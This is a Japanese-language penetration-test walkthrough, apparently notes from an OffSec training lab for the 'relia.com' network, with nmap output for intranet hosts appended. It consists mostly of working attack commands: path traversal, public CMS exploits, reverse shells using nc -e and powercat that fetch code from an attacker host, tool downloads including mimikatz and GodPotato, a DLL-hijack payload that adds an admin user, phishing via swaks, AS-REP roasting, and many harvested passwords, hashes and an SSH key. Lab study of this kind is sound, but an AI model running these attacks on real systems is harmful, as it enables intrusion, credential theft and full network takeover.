port scanの結果から245 WEB01のapacheに脆弱性があることを確認
```
curl http://192.168.102.245:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
```

出力結果から
```
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
```

RCEには持って行けず

248のdir scanで以下のログインポータルを発見し、`admin` `password`のデフォルトクレデンシャルでログイン可能
```
http://192.168.146.248/Host/portalid/0
```

DotNetNukeというCMSを使用しており、以下のユーザを発見
```
emma@relia.com
```

hacktricksに載ってるreverse shellの実行方法を使用しreverse shell獲得
https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/dotnetnuke-dnn

```
cd C:\
mkdir Tools
cd Tools
iwr -uri http://192.168.45.x4:8000/nc64.exe -outfile nc.exe
iwr -uri http://192.168.45.x4:8000/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
iwr -uri http://192.168.45.x4:8000/agent.exe -outfile agent.exe
iwr -uri http://192.168.45.x4:8000/winPEASx64.exe -outfile winPEASx64.exe
iwr -uri http://192.168.45.x4:8000/winPEASx86.exe -outfile winPEASx86.exe
iwr -uri http://192.168.45.x4:8000/mimikatz.exe -outfile mimikatz.exe
iwr -uri http://192.168.45.x4:8000/Rubeus.exe -outfile Rubeus.exe
iwr -uri http://192.168.45.x4:8000/SharpHound.ps1 -outfile SharpHound.ps1
./agent.exe -connect 192.168.45.x:11601 -ignore-cert
```

godpotatoでsystem shell獲得
```
./GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.233 4445"
```

mimikatz実行
```
.\mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::tickets" exit > mimikatz_result.txt
```

markのハッシュ獲得
```
mark:666949a828be051120b17ccba8aebfbe
emma:289953cccf62743ca4d1ed65183bd868
Administrator:56e4633688c0fdd57c610faf9d7ab8df
```

crackを試みるが無理だった

local.txtとproof.txtを取得 (.248)
```
type C:\Users\emma\Desktop\local.txt
type C:\Users\mark\Desktop\proof.txt
```

いったんハッシュでnxc実行したが、どこも入れなさそう
winpeas実行（時間かかりそう）

.247の14020ポートでftpが動いてるのでanonymousでログイン
```
ftp ftp://anonymous:anonymous@192.168.146.247:14020
```

umbraco.pdfが見つかるのでダウンロードしてみると、以下のクレデンシャル情報が取れる
```
mark@relia.com:OathDeeplyReprieve91
```

web02.relia.comをetc/hostsに入れて14080にアクセスするとumbracoというCMSを利用していることわかる。
markのクレデンシャル情報でログインし、umbraco v 7.12.4であることを見て、searchsploitで探す
```
searchsploit umbraco
```

49488.pyを利用して192.168.45.233 4449でrevshell作成(powershellから直接は無理だった)
```
python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080' -c "powershell" -a "mkdir ../../../../Tools"

python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080' -c "powershell" -a "iwr -uri http://192.168.45.233:8000/nc64.exe -outfile ../../../../Tools/nc.exe"

python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080' -c "powershell" -a "../../../../Tools/nc.exe 192.168.45.233 4449 -e cmd.exe"
```

godpotatoでsystemshell獲得
```
./GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.233 4445"
```

proof.txt取得
```
type C:\Users\Administrator\Desktop\proof.txt
type C:\local.txt
```

mimiktazでクレデンシャル情報取得
```
mark:dcbbff66580202a5cbede9c010281ce9
zachary:54abdf854d8c0653b1be3458454e4a3b
```

xampp以下のディレクトリでテキストを列挙
```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

passwords.txtを発見
```
type C:\xampp\passwords.txt
```

```
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords). 
```

.245でパストラバーサルの脆弱性があるため、/etc/passwdでユーザを覗く
```
curl http://192.168.104.245:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

5キャラいることが判明
```
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
```

anitaのプライベートキーを摂取
```
curl http://192.168.104.245:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa
```

パスフレーズクラック
```
ssh2john id_ecdsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

ssh接続
```
ssh -s 2222 anita@192.104.245 -i ./id_ecdsa
```

local.txt
```
cat /home/anita/local.txt
```

linpeasCVE-2021-3165がサジェストされるので、以下のエクスプロイトを使用して権限昇格
https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit/tree/main

proof.txtを取得
```
cat /root/proof.txt
```

.246にanitaで同じ秘密鍵を利用してssh接続
```
ssh -s 2222 anita@192.104.246 -i ./id_ecdsa
```

8000ポートがlocalで開いてるので、ポートフォワードで持ってくる
```
ssh -p 2222 -L 4444:localhost:8000 anita@192.168.104.246 -i ./id_ecdsa
```

LFIの脆弱性があるのでphpのリバースシェルを/dev/shmに設置する
```
curl http://localhost:4444/backend/?view=../../../../../../../dev/shm/revshell.php
```

local.txtを取得
```
cat /home/anita/local.txt
```

proof.txtを取得
```
cat /root/proof.txt
```

.249はポート8000でhttpサーバが起動してるので、ディレクトリスキャンを実施する
```
http://192.168.146.249:8000/cms/
```

cmsというディレクトリを発見できるので、ファイルスキャンを実施
```
http://192.168.104.249:8000/cms/admin.php
```

上記にアクセスしてadmin:adminでログイン

以下のmethod:1を実行してリバースシェルを獲得
https://www.exploit-db.com/exploits/50616

godpotatoからだとpowershellのシェルが安定しないので、winPEASでenumerationすると取得できるPSReadLineの情報からリモートでログインする
```
type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
ipconfig
hostname
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
```

damonのクレデンシャル情報
```
damon:i6yuT6tym@
```

mimikatzでは何も情報なし

enumerationを回すとgitコマンドがインストールされていることが分かる
```
*Evil-WinRM* PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

displayname
-----------

Git

XAMPP
VMware Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913

```

stagingフォルダでgitによりコミット履歴を調べる
```
git history
```

showでコミット番号の中身を調べる
```
git show <コミット番号>
```

最初のコミット番号にクレデンシャル情報が含まれていることが分かる
```
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@relia.com as he is responsible for the mail server.
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file
```

クレデンシャル情報
```
maildmz@relia.com:DPuBT9tGCBrTbR
```

ユーザ
```
damian
jim@relia.com
adrian
damon
maildmz
```

189のSMTPサーバを使ってswaksでフィッシングメールを送る
```
sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.x.x --body @body.txt --header "Subject: Staging Script" --suppress-data -au maildmz@relia.com -ap DPuBT9tGCBrTbR
```

.14からリバースシェルが取れる
winpeasで以下のファイルを確認
```
type C:\Users\jim\Pictures\exec.ps1
```

local.txt, proof.txtを取得
```
type C:\Users\jim\Desktop\local.txt
type C:\Users\offsec\Desktop\proof.txt
```

中からjimのパスワード
```
Castello1!
```

kbdxファイルを発見するのでクラック
```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```

マスターパスワードをとれる
```
mercedes1
```

kpcliで開く
```
kpcli --kdb=./Database.kdbx
```
```
show -f 0
```

dmzadminのパスワードを手に入れる
```
dmzadmin:SlimGodhoodMope
```

.191 にrdpでログイン
```
xfreerdp3 /u:dmzadmin /p:SlimGodhoodMope /v:192.168.159.191 
```

Desktopにproof.txtを取得

ligolo-ngをセット
```
./agent -connect 192.168.45.194:11601 -ignore-cert
```

.14の中から直接DCへのアクセスが許可されていないので、プロキシ経由でASREP-ROASTINGを試みる
```
sudo impacket-GetNPUsers -dc-ip  172.16.119.6 -request -outputfile hashes.asreproast relia.com/jim
```

michellaのasrepハッシュが取れる
```
michelle:NotMyPassword0k?
```

smb nxcすると、以下はどこでも資格情報があってそうなので、入れるかを確認
```
maildmz:DPuBT9tGCBrTbR
jim:Castello1!
michelle:NotMyPassword0k?
```

.7にmichelleのクレデンシャルでRDP可能なことを確認
Desktopにlocal.txt
```
type C:\Users\michelle\Desktop\local.txt
```

ドメインのユーザ情報
```
andra
annna
brad
dan
iis_service
internaladmin
jenny
jim
krbtgt
larry
maildmz
michelle
milana
mountuser
```

.7のPEはC:\Schedulerにscheduler.exeがいるのでdll hijackingできそう
icaclsで見るとC:\Schedulerには読み取り実行権限しかない
scheduler.exeをダウンロードしてきてwinprepでdll hijacking可能か確かめる
`beyondhelper.dll`をdllでカレントディレクトリから読み込んでることを確認

`beyondhelper.dll`でペイロードを作成する。以下を利用してkaliユーザ作成しAdministratorsとRemote Desktop Usersのグループに追加
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user kali password123! /add");
  	    i = system ("net localgroup administrators kali /add");
  	    i = system ("net localgroup \"Remote Desktop Users\" kali /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```
x86_64-w64-mingw32-gcc adduser.cpp --shared -o beyondhelper.dll
```

RDPで接続しなおし、powershell -> run as adminでHigh Mandatory levelのシェルを獲得
GodPotatoを利用してSYSYTEMシェルを取得
```
./GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.194 5555"
```

proof.txtを取得
```
type C:\Users\Administrator\Desktop\proof.txt
```

mimikatzでandreaのクレデンシャル情報を取得
```
andrea:PasswordPassword_6
```

nxcでスキャン(14,7は除く)
pwnedなし
```
sudo nxc smb ip.txt -u andrea -p "PasswordPassword_6" --continue-on-success 
```

rdpスキャン
```
sudo nxc rdp ip.txt -u andrea -p "PasswordPassword_6" --continue-on-success
```

.15が入れる
```
xfreerdp3 /u:andrea /p:"PasswordPassword_6" /v:172.16.119.15 
```

local.txtを取得
```
type C:\Users\andrea\Desktop\local.txt
```

schtaskを見ると、schedule.ps1が実行されてるのが見つかる
```
PS C:\updatecollector> schtasks /query /fo LIST /v | findstr /C:"Task To Run:" | findstr /V /I "system32 COM handler"
Task To Run:                          %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe /reporting
Task To Run:                          %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
Task To Run:                          powershell.exe -ep bypass -File C:\schedule.ps1
Task To Run:                          powershell.exe -ep bypass -File C:\schedule.ps1
Task To Run:                          BthUdTask.exe $(Arg0)
Task To Run:                          sc.exe config upnphost start= auto
Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe -IdleTask -TaskName WdCacheMaintenance
Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe -IdleTask -TaskName WdCleanup
Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob
Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe -IdleTask -TaskName WdVerification
```

icaclsでAuthenticated Usersは編集可能なので、schedule.ps1にリバースシェルを書き込み
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.x.x/powercat.ps1");powercat -c 192.168.x.x -p 4444 -e powershell 
```

権限が高いmilanaのシェルを取得
mimikatzで以下のクレデンシャル情報を取得
```
milana:2237ff5905ec2fd9ebbdfa3a14d1b2b6
offsec:cf998001c44803b490a46f363a2ca812
```

proof.txtを取得
```
type C:\Users\milana\Desktop\proof.txt 
```

keepassデータベースを発見
```
C:\Users\milana\Documents\Database.kdbx
```

passwordクラックすると以下
```
destiny1
```

以下のクレデンシャル情報を手に入れる
```
Title: BACKUP Machine SSH Key
Uname: sarah
 Pass: placeholder
  URL: 
Notes: -----BEGIN OPENSSH PRIVATE KEY-----
       b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
       QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
       YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
       AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
       YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
       -----END OPENSSH PRIVATE KEY-----
```

上記のプライベートキーで19に入れることを確認
```
ssh -p 22 sarah@172.16.119.19 -i ./sarah_id_rsa
```

local.txtを取得
```
cat local.txt
```

linpeasを実行
sudo borgが実行できることを確認

下記がバックアップフォルダのよう
```
/opt/backupborg
```

pspyを使ってborgのパスフレーズを獲得
```
./pspy64
```

borgでパスフレーズを使用して標準出力させる
```
sudo borg extract --stdout /opt/borgbackup/::home 
```

最後の行で以下を確認
```
mesg n 2> /dev/null || true
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
}
32022-10-17T22:29:47.295286/opt/borgbackup00000000200000a1
```

amyのパスワードとandrewのパスワードを確認
```
andrew:Rb9kNokjDsjYyH
amy:0814b6b7f0de51ecf54ca5b6e6e612bf
```

amyのパスワードがMD5なのでcrackstationにかける
```
amy:backups1
```

amyへユーザ変更
```
su amy
```

sudo権限を持っているので権限昇格
```
sudo su
```

proof.txtを取得
```
cat /root/proof.txt
```

.20へandrewの情報を使ってsshでログイン
```
ssh -p 22 andrew@172.16.119.20
```

linpeas実行するとdoasのコンフィグが見える
```
permit nopass mandrew as root cmd service args apache24 onestart
```

コマンドを実行
```
doas -u root service apache24 onestart
```

apacheが起動する。書き込み権限のあるtmpにリバースシェルを置く
```
/usr/local/www/apache24/data/phpMyAdmin/tmp
```

ブラウザからアクセスしてwwwユーザでシェルを獲得

local.txt proof.txtを取得
```
cat /usr/home/andrew/local.txt
cat /root/proof.txt
```
# Port Scan
# Intranet
## 6 (DC02)
### portscan
```
Open 172.16.119.6:53
Open 172.16.119.6:88
Open 172.16.119.6:135
Open 172.16.119.6:139
Open 172.16.119.6:389
Open 172.16.119.6:445
Open 172.16.119.6:464
Open 172.16.119.6:593
Open 172.16.119.6:636
Open 172.16.119.6:9389
```

### port details
```
PORT     STATE SERVICE       REASON         VERSION
53/tcp   open  domain        syn-ack ttl 64 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 64 Microsoft Windows Kerberos (server time: 2025-08-28 05:58:34Z)
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 64
464/tcp  open  kpasswd5?     syn-ack ttl 64
593/tcp  open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 64
9389/tcp open  mc-nmf        syn-ack ttl 64 .NET Message Framing

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 54873/tcp): CLEAN (Timeout)
|   Check 2 (port 16241/tcp): CLEAN (Timeout)
|   Check 3 (port 49947/udp): CLEAN (Timeout)
|   Check 4 (port 2141/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:07:b6 (VMware)
| Names:
|   DC02<00>             Flags: <unique><active>
|   DC02<20>             Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
|   RELIA<1c>            Flags: <group><active>
|   RELIA<1b>            Flags: <unique><active>
| Statistics:
|   00:50:56:ab:07:b6:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-28T05:58:53
|_  start_date: N/A
|_clock-skew: 0s

```
## 7 (INTRANET)
### portscan
```
Open 172.16.119.7:80
Open 172.16.119.7:135
Open 172.16.119.7:139
Open 172.16.119.7:443
Open 172.16.119.7:445
Open 172.16.119.7:3306
Open 172.16.119.7:3389
Open 172.16.119.7:5985
```

### port details
```
80/tcp   open  http          syn-ack ttl 64 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-generator: WordPress 6.0.3
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was http://172.16.119.7/wordpress/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      syn-ack ttl 64 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was https://172.16.119.7/wordpress/
|_ssl-date: TLS randomness does not represent time
|_http-generator: WordPress 6.0.3
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 64
3306/tcp open  mysql         syn-ack ttl 64 MariaDB 10.3.23 or earlier (unauthorized)
3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
|_ssl-date: 2025-08-28T06:02:20+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=INTRANET.relia.com
| Issuer: commonName=INTRANET.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-27T05:30:27
| Not valid after:  2026-02-26T05:30:27
| MD5:   2bf2:e0fd:3b58:ba90:d238:70e9:90ff:7359
| SHA-1: e5c0:4aba:eb9b:04ef:72c8:c1dd:80bf:6b5c:ba5c:9aef
| -----BEGIN CERTIFICATE-----
| MIIC6DCCAdCgAwIBAgIQMS5k7JMTr49Eujio6/ilNjANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDExJJTlRSQU5FVC5yZWxpYS5jb20wHhcNMjUwODI3MDUzMDI3WhcN
| MjYwMjI2MDUzMDI3WjAdMRswGQYDVQQDExJJTlRSQU5FVC5yZWxpYS5jb20wggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDgkk7ePAxPKZKUQDaPPUFiAy6u
| JFTcXBCYSS10+wTzVvELiP26jM//kFqIE1v0P0Jq6/bvj6UtRfqZAAdfxM+pNtCZ
| +kv/8qKtOv8XLLZ77LUOlhM50r5tu9fIA/1Aqk24vl8kwr9+EXFsr+puKJUsFgsL
| g8B8Nm1MW/JlxvvdvDGtZk/Zzk4bgLKrNVGmW31TPuxhN2MSQ/vHRgaVstvoad7V
| I7S6QtMnL5tjHVHLnOpzBgc3jJuspGVG4/AejWSQu1e6yqQHvjMRfGFIdK9Coi/6
| zXiwnKWcU3zqPmDQphPA6ffkmkPAx677gGYXQL70bPxroemgAY+JUXlKRXN1AgMB
| AAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG
| 9w0BAQsFAAOCAQEAy94MdVAOaRqPBV/P4aHaxpbKnDag/yEW50gmcUE9r22o85Bn
| HLnfymrPHkLj/V8CN0jI3rIDtvzkgdjTFMTVpR1e14sjps3C3dq1zs8eCN0MtbB3
| +3XxqzsBZtD4SRyawslJX2tPulQ57DFc15MMGu3rwp2q6iLEQt798VQHvw2ifiZ9
| uCb3+DKvNferpPZtTfT/tv5kkUVTFDIVwHUeoRkX5hzYyTPjGoHx7wLO5qPunZOA
| idNUDKTCYwcUe9aMJ4hjt/f00HQPJALA0qbvq4tlgttRkTQusH4JO+cyqVtru0lj
| 0A6tQkh14qoFJdRIDlzLX4zvN3T7/hUKDp0PeQ==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: INTRANET
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: INTRANET.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-28T06:01:42+00:00
5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/28%OT=80%CT=%CU=%PV=Y%G=N%TM=68AFF0EE%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%II=RI%TS=A)
SEQ(SP=FD%GCD=1%ISR=10A%TI=RD%CI=I%II=RI%TS=8)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 15.363 days (since Tue Aug 12 17:20:08 2025)
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-28T06:01:41
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: INTRANET, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:7a:6b (VMware)
| Names:
|   INTRANET<20>         Flags: <unique><active>
|   INTRANET<00>         Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
| Statistics:
|   00:50:56:ab:7a:6b:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 24924/tcp): CLEAN (Timeout)
|   Check 2 (port 53990/tcp): CLEAN (Timeout)
|   Check 3 (port 42418/udp): CLEAN (Timeout)
|   Check 4 (port 48151/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

### feroxbuster
```

```
## 14 (WK01)

## 15 (WK02)
### portscan
```
Open 172.16.119.15:139
Open 172.16.119.15:135
Open 172.16.119.15:445
Open 172.16.119.15:3389
```
### port details
```
PORT     STATE SERVICE       REASON         VERSION
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 64
3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
|_ssl-date: 2025-08-28T06:03:58+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WK02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WK02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.22000
|_  System_Time: 2025-08-28T06:03:19+00:00
| ssl-cert: Subject: commonName=WK02.relia.com
| Issuer: commonName=WK02.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-27T05:30:38
| Not valid after:  2026-02-26T05:30:38
| MD5:   196b:ddcb:48a1:8cd9:76fb:34f8:d86d:5ffb
| SHA-1: 9710:bc4d:2431:779a:cb3a:1a6c:cd3e:9108:34a0:ce68
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQGvgPn4jk/bZD9oruAkBPKzANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5XSzAyLnJlbGlhLmNvbTAeFw0yNTA4MjcwNTMwMzhaFw0yNjAy
| MjYwNTMwMzhaMBkxFzAVBgNVBAMTDldLMDIucmVsaWEuY29tMIIBIjANBgkqhkiG
